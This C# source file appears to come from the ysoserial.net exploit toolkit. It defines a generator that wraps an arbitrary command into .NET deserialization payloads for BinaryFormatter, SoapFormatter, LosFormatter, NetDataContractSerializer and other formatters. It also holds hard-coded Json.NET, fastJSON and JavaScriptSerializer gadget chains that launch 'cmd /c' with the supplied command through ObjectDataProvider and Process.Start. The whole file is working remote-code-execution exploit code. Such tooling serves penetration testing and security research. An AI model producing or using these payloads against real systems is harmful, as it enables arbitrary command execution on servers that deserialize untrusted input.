using fastJSON;
using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.Serialization;
using System.Runtime.Serialization.Formatters.Binary;
using System.Runtime.Serialization.Formatters.Soap;
using System.Web.UI;
using System.Web.Script.Serialization;
using System.Linq;

namespace ysoserial.Generators
{
    abstract class GenericGenerator : Generator
    {
        public abstract string Description();

        public abstract object Generate(string cmd, string formatter, Boolean test);

        public abstract string Name();

        public abstract List<string> SupportedFormatters();

        public Boolean IsSupported(string formatter)
        {
            var formatters = SupportedFormatters();
            var lowercased = formatters.Select(x => x.ToLower()).ToList();
            if (lowercased.Contains(formatter.ToLower())) return true;
            else return false;
        }

        public object Serialize(object cmdobj, string formatter, Boolean test)
        {
            MemoryStream stream = new MemoryStream();
          
            if (formatter.ToLower().Equals("binaryformatter"))
            {
                BinaryFormatter fmt = new BinaryFormatter();
                fmt.Serialize(stream, cmdobj);
                if (test)
                {
                    try
                    {
                        stream.Position = 0;
                        fmt.Deserialize(stream);
                    } 
                    catch {
                    }
                }
                return stream.ToArray();
            }
            else if (formatter.ToLower().Equals("objectstateformatter"))
            {
                ObjectStateFormatter osf = new ObjectStateFormatter();
                osf.Serialize(stream, cmdobj);
                if (test)
                {
                    try
                    {
                        stream.Position = 0;
                        osf.Deserialize(stream);
                    }
                    catch
                    {
                    }
                }
                return stream.ToArray();
            }
            else if (formatter.ToLower().Equals("soapformatter"))
            {
                SoapFormatter sf = new SoapFormatter();
                sf.Serialize(stream, cmdobj);
                if (test)
                {
                    try
                    {
                        stream.Position = 0;
                        sf.Deserialize(stream);
                    }
                    catch
                    {
                    }
                }
                return stream.ToArray();
            }
            else if (formatter.ToLower().Equals("netdatacontractserializer"))
            {
                NetDataContractSerializer ndcs = new NetDataContractSerializer();
                ndcs.Serialize(stream, cmdobj);
                if (test)
                {
                    try
                    {
                        stream.Position = 0;
                        ndcs.Deserialize(stream);
                    }
                    catch
                    {
                    }
                }
                return stream.ToArray();
            }
            else if (formatter.ToLower().Equals("losformatter"))
            {
                LosFormatter lf = new LosFormatter();
                lf.Serialize(stream, cmdobj);
                if (test)
                {
                    try
                    {
                        stream.Position = 0;
                        lf.Deserialize(stream);
                    }
                    catch
                    {
                    }
                }
                return stream.ToArray();
            }
            else if (formatter.ToLower().Equals("json.net"))
            {
                String payload = @"{
    '$type':'System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35', 
    'MethodName':'Start',
    'MethodParameters':{
        '$type':'System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089',
        '$values':['cmd','/c " + cmdobj + @"']
    },
    'ObjectInstance':{'$type':'System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089'}
}";
                if (test)
                {
                    try
                    {
                        Object obj = JsonConvert.DeserializeObject<Object>(payload, new JsonSerializerSettings
                        {
                            TypeNameHandling = TypeNameHandling.Auto
                        }); ;
                    }
                    catch
                    {
                    }
                }
                return payload;
            }
            else if (formatter.ToLower().Equals("fastjson"))
            {
                String payload = @"{
    ""$types"":{
        ""System.Windows.Data.ObjectDataProvider, PresentationFramework, Version = 4.0.0.0, Culture = neutral, PublicKeyToken = 31bf3856ad364e35"":""1"",
        ""System.Diagnostics.Process, System, Version = 4.0.0.0, Culture = neutral, PublicKeyToken = b77a5c561934e089"":""2"",
        ""System.Diagnostics.ProcessStartInfo, System, Version = 4.0.0.0, Culture = neutral, PublicKeyToken = b77a5c561934e089"":""3""
    },
    ""$type"":""1"",
    ""ObjectInstance"":{
        ""$type"":""2"",
        ""StartInfo"":{
            ""$type"":""3"",
            ""FileName"":""cmd"",
            ""Arguments"":""/c " + cmdobj + @"""
        }
    },
    ""MethodName"":""Start""
}";
                if (test)
                {
                    try
                    {
                        var instance = JSON.ToObject<Object>(payload);

                    }
                    catch
                    {
                    }
                }
                return payload;
            }
            else if (formatter.ToLower().Equals("javascriptserializer"))
            {
                String payload = @"{
    '__type':'System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35', 
    'MethodName':'Start',
    'ObjectInstance':{
        '__type':'System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089',
        'StartInfo': {
            '__type':'System.Diagnostics.ProcessStartInfo, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089',
            'FileName':'cmd',
            'Arguments':'/c " + cmdobj + @"'
        }
    }
}";
                if (test)
                {
                    try
                    {
                        JavaScriptSerializer jss = new JavaScriptSerializer(new SimpleTypeResolver());
                        var json_req = jss.Deserialize<Object>(payload);
                    }
                    catch
                    {
                    }
                }
                return payload;
            }
            else
            {
                throw new Exception("Formatter not supported");
            }
        }
    }
}
